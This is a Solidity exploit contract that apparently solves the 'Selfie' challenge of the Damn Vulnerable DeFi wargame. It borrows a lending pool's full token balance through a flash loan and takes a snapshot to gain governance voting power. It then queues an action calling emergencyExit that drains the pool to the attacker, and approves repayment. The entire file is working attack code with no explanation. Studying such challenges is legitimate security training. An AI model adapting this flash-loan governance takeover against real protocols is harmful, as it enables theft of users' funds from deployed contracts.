// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

pragma solidity ^0.8.0;

interface IDamnVulnerableToken {
    function balanceOf(address owner) external returns (uint256);

    function snapshot() external returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
}

interface ISimpleGovernance {
    function queueAction(
        address target,
        uint128 value,
        bytes calldata data
    ) external returns (uint256 actionId);

    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);
}

interface ISelfiePool {
    function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external;

    function emergencyExit(address receiver) external;
}

contract ExploitSelfie is IERC3156FlashBorrower {
    ISelfiePool immutable i_selfiePool;
    ISimpleGovernance immutable i_simpleGovernance;
    IDamnVulnerableToken immutable i_damnVulnerableToken;
    address immutable i_player;
    uint256 s_actionExploitId;

    constructor(address pool, address governance, address token) {
        i_selfiePool = ISelfiePool(pool);
        i_simpleGovernance = ISimpleGovernance(governance);
        i_damnVulnerableToken = IDamnVulnerableToken(token);
        i_player = msg.sender;
    }

    function flashLoan() external {
        uint256 loanAmount = i_damnVulnerableToken.balanceOf(
            address(i_selfiePool)
        );


        i_selfiePool.flashLoan(
            IERC3156FlashBorrower(this),
            address(i_damnVulnerableToken),
            loanAmount,
            ""
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        bytes memory emergencyExitCalldata = abi.encodeWithSignature(
            "emergencyExit(address)",
            address(i_player)
        );
        i_damnVulnerableToken.snapshot();
        s_actionExploitId = i_simpleGovernance.queueAction(
            address(i_selfiePool),
            0,
            emergencyExitCalldata
        );


        // i_damnVulnerableToken.transfer(address(i_selfiePool), amount);
        i_damnVulnerableToken.approve(address(i_selfiePool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function getExploitActionId() public view returns (uint256) {
        return s_actionExploitId;
    }
}
